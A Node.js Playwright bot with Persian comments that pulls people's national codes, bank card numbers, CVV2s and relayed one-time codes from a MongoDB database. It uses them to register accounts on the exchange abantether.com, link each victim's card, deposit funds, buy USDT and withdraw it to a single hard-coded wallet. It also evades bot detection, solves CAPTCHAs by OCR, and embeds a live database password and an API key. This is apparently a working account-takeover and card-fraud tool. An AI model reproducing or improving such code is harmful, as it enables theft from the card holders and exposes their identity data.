const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

class AbanTetherBot {
    constructor() {
        // تنظیمات MongoDB
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        
        // تنظیمات سایت
        this.website = {
            baseUrl: 'https://abantether.com',
            registerUrl: 'https://abantether.com/register',
            timeout: 60000, // افزایش timeout
            headless: false, // تغییر به false برای دیدن مراحل
            slowMo: 500, // کاهش سرعت برای دیدن بهتر
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        };
        
        // تنظیمات تراکنش
        this.transaction = {
            depositAmount: '5000000',
            withdrawAddress: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
            usdtAmount: '40',
            maxRetries: 3,
            retryDelay: 5000
        };
        
        // تنظیمات AI برای خواندن کپچا
        this.aiConfig = {
            ocrApi: 'https://api.ocr.space/parse/image',
            apiKey: 'K87096188988957' // API رایگان
        };
        
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
        this.isRunning = true;
        this.processingUsers = new Set();
        this.browser = null;
        this.context = null;
        this.page = null;
        this.currentUser = null;
    }

    async initialize() {
        console.log('🚀 شروع ربات آبان تتر...');
        
        try {
            // اتصال به MongoDB
            this.mongoClient = new MongoClient(this.mongoUri);
            await this.mongoClient.connect();
            this.db = this.mongoClient.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            console.log('✅ متصل به MongoDB');
        } catch (error) {
            console.error('❌ خطا در اتصال به MongoDB:', error);
            throw error;
        }
    }

    async startPolling() {
        console.log('🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)...');
        
        // اجرای اولیه
        await this.checkDatabase();
        
        // تنظیم تایمر برای چک هر 30 ثانیه
        setInterval(async () => {
            await this.checkDatabase();
        }, 30000);
    }

    async checkDatabase() {
        try {
            // جستجوی کاربران نیازمند پردازش
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.transaction.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(10).toArray();
            
            console.log(`📊 ${pendingUsers.length} کاربر نیازمند پردازش پیدا شد`);
            
            for (const user of pendingUsers) {
                // اگر کاربر در حال پردازش است، ردش کن
                if (this.processingUsers.has(user.personalPhoneNumber)) {
                    console.log(`⏭️ کاربر ${user.personalPhoneNumber} در حال پردازش است`);
                    continue;
                }
                
                // اگر تعداد تلاش‌ها بیش از حد مجاز است
                const retryCount = user.retryCount || 0;
                if (retryCount >= this.transaction.maxRetries) {
                    console.log(`⛔ کاربر ${user.personalPhoneNumber} بیش از حد تلاش کرده`);
                    await this.markUserFailed(user.personalPhoneNumber, 'تعداد تلاش‌ها بیش از حد مجاز');
                    continue;
                }
                
                // شروع پردازش
                this.processUser(user);
            }
        } catch (error) {
            console.error('❌ خطا در بررسی دیتابیس:', error);
        }
    }

    async processUser(user) {
        const phoneNumber = user.personalPhoneNumber;
        console.log(`👤 شروع پردازش کاربر: ${phoneNumber}`);
        
        // علامت‌گذاری کاربر به عنوان در حال پردازش
        this.processingUsers.add(phoneNumber);
        
        try {
            // آپدیت وضعیت به در حال پردازش
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        status: 'processing',
                        startedAt: new Date(),
                        retryCount: (user.retryCount || 0)
                    },
                    $inc: { __v: 1 }
                }
            );
            
            // اجرای مراحل پردازش
            const result = await this.executeUserProcess(user);
            
            if (result.success) {
                console.log(`✅ کاربر ${phoneNumber} با موفقیت پردازش شد`);
                await this.markUserCompleted(phoneNumber, result.details);
            } else {
                console.log(`❌ خطا در پردازش کاربر ${phoneNumber}: ${result.error}`);
                await this.markUserFailed(phoneNumber, result.error, result.retry);
            }
            
        } catch (error) {
            console.error(`💥 خطای بحرانی در پردازش کاربر ${phoneNumber}:`, error);
            await this.markUserFailed(phoneNumber, `خطای بحرانی: ${error.message}`, true);
        } finally {
            // حذف کاربر از لیست در حال پردازش
            this.processingUsers.delete(phoneNumber);
        }
    }

    async executeUserProcess(user) {
        this.currentUser = user;
        
        try {
            // راه‌اندازی مرورگر
            await this.launchBrowser();
            
            console.log(`🌐 مرحله 1: ثبت‌نام برای ${user.personalPhoneNumber}`);
            
            // ثبت‌نام
            await this.registerUser();
            
            // ورود با رمز عبور
            await this.loginWithPassword();
            
            // تکمیل اطلاعات هویتی
            await this.completeIdentityInfo();
            
            // ثبت قرارداد بانکی
            await this.registerBankContract();
            
            // واریز تومان
            await this.depositToman();
            
            // خرید تتر
            await this.buyUSDT();
            
            // برداشت تتر
            await this.withdrawUSDT();
            
            return {
                success: true,
                details: {
                    stepsCompleted: ['register', 'login', 'identity', 'bank', 'deposit', 'buy', 'withdraw'],
                    completedAt: new Date()
                }
            };
            
        } catch (error) {
            console.error('❌ خطا در اجرای فرآیند:', error);
            // گرفتن اسکرین‌شات از خطا
            await this.takeScreenshot('error');
            return {
                success: false,
                error: error.message,
                retry: true
            };
        } finally {
            await this.closeBrowser();
        }
    }

    async takeScreenshot(name) {
        try {
            const screenshotPath = path.join(__dirname, `screenshot-${name}-${Date.now()}.png`);
            await this.page.screenshot({ path: screenshotPath, fullPage: true });
            console.log(`📸 اسکرین‌شات ذخیره شد: ${screenshotPath}`);
        } catch (error) {
            console.error('خطا در گرفتن اسکرین‌شات:', error);
        }
    }

    async launchBrowser() {
        console.log('🌐 راه‌اندازی مرورگر...');
        this.browser = await chromium.launch({
            headless: this.website.headless,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process'
            ]
        });
        
        this.context = await this.browser.newContext({
            viewport: { width: 1366, height: 768 },
            userAgent: this.website.userAgent,
            locale: 'fa-IR',
            timezoneId: 'Asia/Tehran',
            permissions: ['geolocation']
        });
        
        // اضافه کردن هدرهای اضافی
        await this.context.addInitScript(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
            
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5]
            });
            
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en', 'fa']
            });
        });
        
        this.page = await this.context.newPage();
        await this.page.setDefaultTimeout(this.website.timeout);
        await this.page.setDefaultNavigationTimeout(this.website.timeout);
        
        console.log('✅ مرورگر راه‌اندازی شد');
    }

    async closeBrowser() {
        if (this.page) await this.page.close();
        if (this.context) await this.context.close();
        if (this.browser) await this.browser.close();
        
        this.page = null;
        this.context = null;
        this.browser = null;
        
        console.log('✅ مرورگر بسته شد');
    }

    async registerUser() {
        console.log('📝 مرحله ثبت‌نام...');
        
        // رفتن به صفحه ثبت‌نام
        await this.page.goto(this.website.registerUrl, { 
            waitUntil: 'domcontentloaded',
            timeout: this.website.timeout 
        });
        
        await this.page.waitForTimeout(3000);
        
        // گرفتن اسکرین‌شات از صفحه
        await this.takeScreenshot('register-page');
        
        // روش 1: جستجوی همه inputها برای پیدا کردن فیلد موبایل
        const allInputs = await this.page.$$('input');
        console.log(`🔍 تعداد inputها در صفحه: ${allInputs.length}`);
        
        for (const input of allInputs) {
            const placeholder = await input.getAttribute('placeholder');
            const name = await input.getAttribute('name');
            const id = await input.getAttribute('id');
            const type = await input.getAttribute('type');
            
            console.log(`Input - placeholder: ${placeholder}, name: ${name}, id: ${id}, type: ${type}`);
            
            if (placeholder && placeholder.includes('موبایل')) {
                console.log('✅ فیلد موبایل پیدا شد');
                await input.fill(this.currentUser.personalPhoneNumber);
                break;
            }
        }
        
        // اگر فیلد پیدا نشد با روش جایگزین
        if (!await this.page.$('input[placeholder*="موبایل"]')) {
            console.log('🔍 جستجوی جایگزین برای فیلد موبایل...');
            
            // تلاش با selectors مختلف
            const selectors = [
                'input[type="tel"]',
                'input[type="number"]',
                'input[name*="phone"]',
                'input[name*="mobile"]',
                'input#mobile',
                'input#phone',
                'input.form-control',
                'input[class*="input"]'
            ];
            
            for (const selector of selectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element && await element.isVisible()) {
                        await element.fill(this.currentUser.personalPhoneNumber);
                        console.log(`✅ فیلد با سلکتور ${selector} پر شد`);
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
        }
        
        // پیدا کردن دکمه ثبت نام
        console.log('🔍 جستجوی دکمه ثبت نام...');
        const buttons = await this.page.$$('button');
        console.log(`🔍 تعداد دکمه‌ها در صفحه: ${buttons.length}`);
        
        for (const button of buttons) {
            const text = await button.textContent();
            if (text && (text.includes('ثبت نام') || text.includes('ادامه') || text.includes('ارسال'))) {
                console.log(`✅ دکمه پیدا شد: ${text}`);
                await button.click();
                break;
            }
        }
        
        // اگر دکمه پیدا نشد
        if (!await this.page.$('button:has-text("ثبت نام")')) {
            await this.clickByText('ثبت نام');
        }
        
        console.log('⏳ منتظر صفحه OTP...');
        await this.page.waitForTimeout(5000);
        
        // گرفتن اسکرین‌شات از صفحه OTP
        await this.takeScreenshot('otp-page');
        
        // بررسی ساختار صفحه OTP
        const pageHtml = await this.page.content();
        if (pageHtml.includes('کد ارسال شده') || pageHtml.includes('رمز یکبار مصرف')) {
            console.log('✅ صفحه OTP شناسایی شد');
        }
        
        // انتظار برای OTP در دیتابیس
        console.log('⏳ منتظر OTP لاگین در دیتابیس...');
        const otpLogin = await this.waitForFieldInDatabase('otp_login');
        
        if (!otpLogin) {
            throw new Error('OTP لاگین دریافت نشد');
        }
        
        console.log(`✅ OTP دریافت شد: ${otpLogin}`);
        
        // وارد کردن OTP
        await this.enterOtp(otpLogin);
        
        // کلیک روی مرحله بعد
        await this.clickByText('مرحله بعد');
        
        await this.page.waitForTimeout(3000);
    }

    async loginWithPassword() {
        console.log('🔐 مرحله ورود با رمز عبور...');
        
        await this.page.waitForTimeout(2000);
        
        // گرفتن اسکرین‌شات
        await this.takeScreenshot('password-page');
        
        // پر کردن رمز عبور
        await this.fillByPlaceholder('رمز عبور خود را وارد نمایید', 'ImSorryButIhaveTo@1');
        
        // کلیک روی تایید
        await this.clickByText('تایید');
        
        await this.page.waitForTimeout(3000);
    }

    async completeIdentityInfo() {
        console.log('👤 مرحله تکمیل اطلاعات هویتی...');
        
        await this.page.waitForTimeout(2000);
        
        // گرفتن اسکرین‌شات
        await this.takeScreenshot('identity-page');
        
        // پر کردن کد ملی
        await this.fillByLabel('کد 10 رقمی شناسایی خود را وارد کنید', this.currentUser.personalNationalCode);
        
        // پر کردن تاریخ تولد
        await this.fillByPlaceholder('روز/ماه/سال', this.currentUser.personalBirthDate);
        
        // کلیک روی ثبت
        await this.clickByText('ثبت');
        
        await this.page.waitForTimeout(5000);
        
        // بررسی اگر باکس تایید باز شد
        try {
            await this.clickByText('ادامه', 2000);
            console.log('✅ باکس تایید بسته شد');
        } catch (error) {
            console.log('باکس تایید باز نشد');
        }
    }

    async registerBankContract() {
        console.log('💳 مرحله ثبت قرارداد بانکی...');
        
        // کلیک روی کیف پول
        await this.clickByText('کیف پول');
        
        // کلیک روی واریز
        await this.clickByText('واریز');
        
        // کلیک روی تومان
        await this.clickByText('تومان');
        
        await this.page.waitForTimeout(3000);
        
        // رفتن به صفحه افزودن قرارداد
        await this.page.goto('https://abantether.com/user/wallet/deposit/irt/direct', { 
            waitUntil: 'domcontentloaded',
            timeout: this.website.timeout 
        });
        
        await this.page.waitForTimeout(3000);
        
        // گرفتن اسکرین‌شات
        await this.takeScreenshot('add-contract-page');
        
        // کلیک روی افزودن قرارداد
        await this.clickByText('افزودن قرارداد');
        
        await this.page.waitForTimeout(2000);
        
        // انتخاب بانک بر اساس فیلد bank در دیتابیس
        const bankName = this.currentUser.bank || 'ملی';
        console.log(`🏦 بانک انتخاب شده: ${bankName}`);
        
        // انتخاب بانک
        await this.selectByLabel('نام بانک', bankName);
        
        // انتخاب مدت قرارداد
        await this.selectByLabel('مدت قرار داد', '1 ماه');
        
        // کلیک روی ثبت و ادامه
        await this.clickByText('ثبت و ادامه');
        
        await this.page.waitForTimeout(3000);
        
        // پردازش بر اساس بانک
        if (bankName === 'ملی') {
            await this.processMelliBank();
        } else {
            await this.processGenericBank(bankName);
        }
        
        await this.page.waitForTimeout(5000);
    }

    async processMelliBank() {
        console.log('🏦 پردازش بانک ملی...');
        
        // کلیک روی ورود با کارت بانک ملی
        await this.clickByText('ورود با کارت بانک ملی');
        
        await this.page.waitForTimeout(3000);
        
        // گرفتن اسکرین‌شات
        await this.takeScreenshot('melli-bank-page');
        
        // پر کردن شماره کارت
        await this.fillByLabel('شماره کارت', this.currentUser.cardNumber);
        
        // خواندن و پر کردن کپچا
        await this.fillCaptcha();
        
        // کلیک روی ارسال رمز فعالسازی
        await this.clickByText('ارسال رمز فعالسازی');
        
        // انتظار برای رمز دوم در دیتابیس
        console.log('⏳ منتظر رمز دوم...');
        const otpCard = await this.waitForFieldInDatabase('otp_register_card');
        if (!otpCard) {
            throw new Error('رمز دوم دریافت نشد');
        }
        
        // وارد کردن رمز دوم
        await this.fillByLabel('رمز فعالسازی', otpCard);
        
        // کلیک روی ادامه
        await this.clickByText('ادامه');
        
        // کلیک روی ثبت قرارداد
        await this.clickByText('ثبت قرارداد');
    }

    async processGenericBank(bankName) {
        console.log(`🏦 پردازش بانک ${bankName}...`);
        
        await this.page.waitForTimeout(2000);
        
        // گرفتن اسکرین‌شات
        await this.takeScreenshot(`${bankName}-bank-page`);
        
        // پر کردن شماره کارت
        await this.fillByLabel('شماره کارت', this.currentUser.cardNumber);
        
        // پر کردن CVV2
        await this.fillByLabel('CVV2', this.currentUser.cvv2);
        
        // پر کردن ماه انقضا
        await this.fillByPlaceholder('ماه', this.currentUser.bankMonth.toString());
        
        // پر کردن سال انقضا
        await this.fillByPlaceholder('سال', this.currentUser.bankYear.toString());
        
        // خواندن و پر کردن کپچا
        await this.fillCaptchaGeneric();
        
        // کلیک روی دریافت رمز پویا
        await this.clickByText('دریافت رمز پویا');
        
        // انتظار برای رمز دوم در دیتابیس
        console.log('⏳ منتظر رمز دوم...');
        const otpCard = await this.waitForFieldInDatabase('otp_register_card');
        if (!otpCard) {
            throw new Error('رمز دوم دریافت نشد');
        }
        
        // وارد کردن رمز دوم
        await this.fillByLabel('رمز دوم', otpCard);
        
        // کلیک روی تایید
        await this.clickByText('تایید');
    }

    async depositToman() {
        console.log('💰 مرحله واریز تومان...');
        
        // پر کردن مبلغ
        await this.fillByLabel('مبلغ واریزی (تومان)', this.transaction.depositAmount);
        
        // انتخاب بانک
        const bankName = this.currentUser.bank || 'ملی';
        await this.selectByLabel('نام بانک', bankName);
        
        // کلیک روی واریز
        await this.clickByText('واریز');
        
        // کلیک روی تایید و پرداخت
        await this.clickByText('تایید و پرداخت');
        
        await this.page.waitForTimeout(3000);
        
        // پردازش صفحه بانک
        await this.processBankPayment(bankName);
        
        await this.page.waitForTimeout(5000);
    }

    async processBankPayment(bankName) {
        console.log(`💳 پردازش پرداخت بانک ${bankName}...`);
        
        await this.page.waitForTimeout(2000);
        
        // گرفتن اسکرین‌شات
        await this.takeScreenshot(`payment-${bankName}`);
        
        try {
            // پر کردن شماره کارت
            await this.fillByLabel('شماره کارت', this.currentUser.cardNumber);
            
            // پر کردن CVV2
            await this.fillByLabel('CVV2', this.currentUser.cvv2);
            
            // پر کردن تاریخ انقضا
            await this.fillByLabel('تاریخ انقضا', `${this.currentUser.bankMonth}/${this.currentUser.bankYear}`);
            
            // خواندن کپچا
            await this.fillCaptchaGeneric();
            
            // کلیک روی پرداخت
            await this.clickByText('پرداخت');
            
        } catch (error) {
            console.log('صفحه بانک متفاوت است، تلاش روش جایگزین...');
            
            // روش جایگزین
            try {
                await this.clickByText('پرداخت اینترنتی');
            } catch (e) {
                console.log('صفحه پرداخت شناسایی نشد');
            }
        }
    }

    async buyUSDT() {
        console.log('🔄 مرحله خرید تتر...');
        
        await this.page.goto('https://abantether.com/user/trade/fast/buy?s=USDT', { 
            waitUntil: 'domcontentloaded',
            timeout: this.website.timeout 
        });
        
        await this.page.waitForTimeout(3000);
        
        // گرفتن اسکرین‌شات
        await this.takeScreenshot('buy-usdt-page');
        
        // پر کردن مقدار خرید
        await this.fillByPlaceholder('مقدار', this.transaction.usdtAmount);
        
        // کلیک روی ثبت سفارش
        await this.clickByText('ثبت سفارش');
        
        await this.page.waitForTimeout(5000);
    }

    async withdrawUSDT() {
        console.log('📤 مرحله برداشت تتر...');
        
        await this.page.goto('https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT', { 
            waitUntil: 'domcontentloaded',
            timeout: this.website.timeout 
        });
        
        await this.page.waitForTimeout(3000);
        
        // گرفتن اسکرین‌شات
        await this.takeScreenshot('withdraw-usdt-page');
        
        // انتخاب رمزارز
        await this.selectByLabel('رمز ارز', 'تتر');
        
        // انتخاب شبکه
        await this.selectByLabel('شبکه برداشت', 'BSC(BEP20)');
        
        // وارد کردن آدرس ولت
        await this.fillByLabel('آدرس ولت مقصد', this.transaction.withdrawAddress);
        
        // وارد کردن مقدار
        await this.fillByLabel('مقدار', this.transaction.usdtAmount);
        
        // کلیک روی ثبت برداشت
        await this.clickByText('ثبت برداشت');
        
        await this.page.waitForTimeout(5000);
    }

    async fillCaptcha() {
        console.log('🔍 خواندن کپچا...');
        
        try {
            // گرفتن اسکرین‌شات از کل صفحه
            await this.takeScreenshot('captcha-page');
            
            // پیدا کردن تصویر کپچا
            const captchaSelectors = [
                'img[src*="captcha"]',
                'img[src*="base64"]',
                '.captcha img',
                '#captcha-img',
                'img.captcha'
            ];
            
            let captchaElement = null;
            for (const selector of captchaSelectors) {
                captchaElement = await this.page.$(selector);
                if (captchaElement) {
                    console.log(`✅ کپچا با سلکتور ${selector} پیدا شد`);
                    break;
                }
            }
            
            if (captchaElement) {
                const screenshot = await captchaElement.screenshot();
                const captchaText = await this.readCaptchaWithOCR(screenshot);
                
                if (captchaText) {
                    // پیدا کردن فیلد کپچا
                    const inputSelectors = [
                        'input[name*="captcha"]',
                        'input[placeholder*="کپچا"]',
                        'input[placeholder*="عبارت"]',
                        'input#captcha',
                        'input.security-code'
                    ];
                    
                    for (const selector of inputSelectors) {
                        const input = await this.page.$(selector);
                        if (input) {
                            await input.fill(captchaText);
                            console.log(`✅ کپچا وارد شد: ${captchaText}`);
                            return;
                        }
                    }
                }
            }
        } catch (error) {
            console.log('خطا در خواندن کپچا:', error);
        }
    }

    async fillCaptchaGeneric() {
        await this.fillCaptcha(); // استفاده از همان تابع
    }

    async readCaptchaWithOCR(imageBuffer) {
        try {
            console.log('🔤 استفاده از OCR برای خواندن کپچا...');
            
            const base64Image = imageBuffer.toString('base64');
            
            const response = await axios.post(this.aiConfig.ocrApi, {
                base64Image: `data:image/png;base64,${base64Image}`,
                apikey: this.aiConfig.apiKey,
                language: 'eng',
                OCREngine: 2
            }, {
                headers: {
                    'Content-Type': 'application/json'
                },
                timeout: 10000
            });
            
            if (response.data && response.data.ParsedResults && response.data.ParsedResults.length > 0) {
                const text = response.data.ParsedResults[0].ParsedText;
                const cleanedText = text.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
                console.log(`📝 متن خوانده شده: ${text} -> ${cleanedText}`);
                return cleanedText;
            }
        } catch (error) {
            console.log('خطا در OCR:', error.message);
        }
        
        return null;
    }

    async fillByPlaceholder(placeholderText, value) {
        console.log(`🔍 جستجوی فیلد با placeholder: ${placeholderText}`);
        
        const selector = `input[placeholder*="${placeholderText}"]`;
        try {
            await this.page.waitForSelector(selector, { timeout: 5000 });
            await this.page.fill(selector, value);
            console.log(`✅ فیلد ${placeholderText} پر شد: ${value}`);
        } catch (error) {
            console.log(`❌ فیلد با placeholder ${placeholderText} پیدا نشد`);
            
            // روش جایگزین
            const inputs = await this.page.$$('input');
            for (const input of inputs) {
                const placeholder = await input.getAttribute('placeholder');
                if (placeholder && placeholder.includes(placeholderText)) {
                    await input.fill(value);
                    console.log(`✅ فیلد جایگزین پیدا و پر شد`);
                    return;
                }
            }
            
            throw new Error(`فیلد با placeholder "${placeholderText}" پیدا نشد`);
        }
    }

    async fillByLabel(labelText, value) {
        console.log(`🔍 جستجوی فیلد با label: ${labelText}`);
        
        const selectors = [
            `label:has-text("${labelText}") + input`,
            `//label[contains(text(), '${labelText}')]/following::input[1]`,
            `input[name*="${labelText.toLowerCase()}"]`,
            `input[placeholder*="${labelText}"]`
        ];
        
        for (const selector of selectors) {
            try {
                await this.page.waitForSelector(selector, { timeout: 3000 });
                await this.page.fill(selector, value);
                console.log(`✅ فیلد ${labelText} پر شد: ${value}`);
                return;
            } catch (error) {
                continue;
            }
        }
        
        console.log(`❌ فیلد با label ${labelText} پیدا نشد`);
        
        // روش جایگزین: جستجوی همه inputها
        const inputs = await this.page.$$('input, textarea, select');
        for (const input of inputs) {
            // بررسی با aria-label
            const ariaLabel = await input.getAttribute('aria-label');
            if (ariaLabel && ariaLabel.includes(labelText)) {
                await input.fill(value);
                console.log(`✅ فیلد با aria-label پیدا و پر شد`);
                return;
            }
            
            // بررسی با نام
            const name = await input.getAttribute('name');
            if (name && name.includes(labelText.toLowerCase())) {
                await input.fill(value);
                console.log(`✅ فیلد با name پیدا و پر شد`);
                return;
            }
        }
        
        throw new Error(`فیلد با label "${labelText}" پیدا نشد`);
    }

    async clickByText(text, timeout = 5000) {
        console.log(`🔍 جستجوی المنت با متن: ${text}`);
        
        const selectors = [
            `button:has-text("${text}")`,
            `a:has-text("${text}")`,
            `input[type="submit"][value*="${text}"]`,
            `input[type="button"][value*="${text}"]`,
            `div:has-text("${text}")`,
            `span:has-text("${text}")`,
            `//button[contains(text(), '${text}')]`,
            `//a[contains(text(), '${text}')]`,
            `//*[contains(text(), '${text}')]`
        ];
        
        for (const selector of selectors) {
            try {
                await this.page.waitForSelector(selector, { timeout: 2000 });
                const element = await this.page.$(selector);
                if (element && await element.isVisible()) {
                    await element.click();
                    console.log(`✅ کلیک روی: ${text}`);
                    await this.page.waitForTimeout(1000);
                    return;
                }
            } catch (error) {
                continue;
            }
        }
        
        console.log(`❌ المنت با متن ${text} پیدا نشد`);
        
        // روش جایگزین: جستجوی همه المنت‌ها
        const allElements = await this.page.$$('*');
        for (const element of allElements) {
            try {
                const elementText = await element.textContent();
                if (elementText && elementText.includes(text) && await element.isVisible()) {
                    await element.click();
                    console.log(`✅ المنت جایگزین پیدا و کلیک شد: ${text}`);
                    return;
                }
            } catch (error) {
                continue;
            }
        }
        
        throw new Error(`المنت با متن "${text}" پیدا نشد`);
    }

    async selectByLabel(labelText, optionText) {
        console.log(`🔍 جستجوی select با label: ${labelText}`);
        
        const selectors = [
            `label:has-text("${labelText}") + select`,
            `//label[contains(text(), '${labelText}')]/following::select[1]`,
            `select[name*="${labelText.toLowerCase()}"]`
        ];
        
        for (const selector of selectors) {
            try {
                await this.page.waitForSelector(selector, { timeout: 3000 });
                await this.page.selectOption(selector, optionText);
                console.log(`✅ select ${labelText} انتخاب شد: ${optionText}`);
                return;
            } catch (error) {
                continue;
            }
        }
        
        console.log(`❌ select با label ${labelText} پیدا نشد`);
        
        // روش جایگزین: جستجوی همه selectها
        const selects = await this.page.$$('select');
        for (const select of selects) {
            // بررسی با aria-label
            const ariaLabel = await select.getAttribute('aria-label');
            if (ariaLabel && ariaLabel.includes(labelText)) {
                await select.selectOption(optionText);
                console.log(`✅ select با aria-label پیدا و انتخاب شد`);
                return;
            }
            
            // بررسی با نام
            const name = await select.getAttribute('name');
            if (name && name.includes(labelText.toLowerCase())) {
                await select.selectOption(optionText);
                console.log(`✅ select با name پیدا و انتخاب شد`);
                return;
            }
        }
        
        throw new Error(`select با label "${labelText}" پیدا نشد`);
    }

    async enterOtp(otp) {
        console.log(`🔢 وارد کردن OTP: ${otp}`);
        
        // جستجوی فیلدهای OTP
        const otpSelectors = [
            'input[type="tel"]',
            'input[type="number"]',
            'input[maxlength="1"]',
            'input.otp-input',
            '.otp-container input'
        ];
        
        for (const selector of otpSelectors) {
            const inputs = await this.page.$$(selector);
            if (inputs.length >= 4) {
                console.log(`✅ ${inputs.length} فیلد OTP پیدا شد`);
                for (let i = 0; i < Math.min(inputs.length, 6); i++) {
                    if (otp[i]) {
                        await inputs[i].fill(otp[i]);
                    }
                }
                return;
            }
        }
        
        // جستجوی فیلد تک
        const singleInputSelectors = [
            'input[name*="otp"]',
            'input[name*="code"]',
            'input#otp',
            'input#code'
        ];
        
        for (const selector of singleInputSelectors) {
            const input = await this.page.$(selector);
            if (input) {
                await input.fill(otp);
                console.log(`✅ فیلد OTP تک پیدا و پر شد`);
                return;
            }
        }
        
        throw new Error('فیلد OTP پیدا نشد');
    }

    async waitForFieldInDatabase(fieldName, maxAttempts = 120) {
        console.log(`⏳ منتظر پر شدن ${fieldName}... (تا ${maxAttempts} ثانیه)`);
        
        let attempts = 0;
        while (attempts < maxAttempts) {
            try {
                const user = await this.collection.findOne(
                    { personalPhoneNumber: this.currentUser.personalPhoneNumber },
                    { projection: { [fieldName]: 1 } }
                );
                
                if (user && user[fieldName] && user[fieldName].toString().trim() !== '') {
                    console.log(`✅ ${fieldName} دریافت شد: ${user[fieldName]}`);
                    return user[fieldName].toString();
                }
                
                attempts++;
                console.log(`⏳ چک ${attempts}/${maxAttempts} - ${fieldName} هنوز خالی است`);
                await new Promise(resolve => setTimeout(resolve, 1000));
                
            } catch (error) {
                console.error(`خطا در چک کردن ${fieldName}:`, error);
                await new Promise(resolve => setTimeout(resolve, 1000));
                attempts++;
            }
        }
        
        console.log(`⏰ زمان انتظار برای ${fieldName} به پایان رسید`);
        return null;
    }

    async markUserCompleted(phoneNumber, details = {}) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                {
                    $set: {
                        processed: true,
                        status: 'completed',
                        completedAt: new Date(),
                        ...details
                    },
                    $unset: {
                        otp_login: "",
                        otp_register_card: "",
                        otp_payment: ""
                    },
                    $inc: { __v: 1 }
                }
            );
            console.log(`✅ کاربر ${phoneNumber} به عنوان تکمیل‌شده علامت‌گذاری شد`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان تکمیل‌شده:`, error);
        }
    }

    async markUserFailed(phoneNumber, reason, shouldRetry = false) {
        try {
            const updateData = {
                $set: {
                    status: 'failed',
                    failureReason: reason,
                    failedAt: new Date()
                },
                $inc: { __v: 1 }
            };
            
            if (shouldRetry) {
                updateData.$inc.retryCount = 1;
            } else {
                updateData.$set.processed = true;
            }
            
            await this.collection.updateOne(
                { personalPhoneNumber: phoneNumber },
                updateData
            );
            
            console.log(`❌ کاربر ${phoneNumber} به عنوان ناموفق علامت‌گذاری شد: ${reason}`);
        } catch (error) {
            console.error(`❌ خطا در علامت‌گذاری کاربر به عنوان ناموفق:`, error);
        }
    }

    async cleanup() {
        console.log('🛑 پاکسازی منابع...');
        this.isRunning = false;
        
        if (this.mongoClient) {
            await this.mongoClient.close();
            console.log('✅ اتصال MongoDB بسته شد');
        }
    }
}

// مدیریت خطاهای غیرمنتظره
process.on('uncaughtException', (error) => {
    console.error('🔥 خطای غیرمنتظره:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 خطای Reject نشده:', reason);
});

// اجرای اصلی
async function main() {
    const bot = new AbanTetherBot();
    
    try {
        await bot.initialize();
        await bot.startPolling();
        
        // مدیریت خاتمه برنامه
        process.on('SIGINT', async () => {
            console.log('\n🛑 دریافت سیگنال خاتمه...');
            await bot.cleanup();
            process.exit(0);
        });
        
        process.on('SIGTERM', async () => {
            console.log('\n🛑 دریافت سیگنال ترمینیت...');
            await bot.cleanup();
            process.exit(0);
        });
        
        console.log('🤖 ربات آماده کار است. Ctrl+C برای توقف.');
        
        // نگه داشتن برنامه در حال اجرا
        await new Promise(() => {});
        
    } catch (error) {
        console.error('💥 خطای بحرانی در اجرای ربات:', error);
        await bot.cleanup();
        process.exit(1);
    }
}

// اگر این فایل مستقیماً اجرا شود
if (require.main === module) {
    main();
}

module.exports = AbanTetherBot;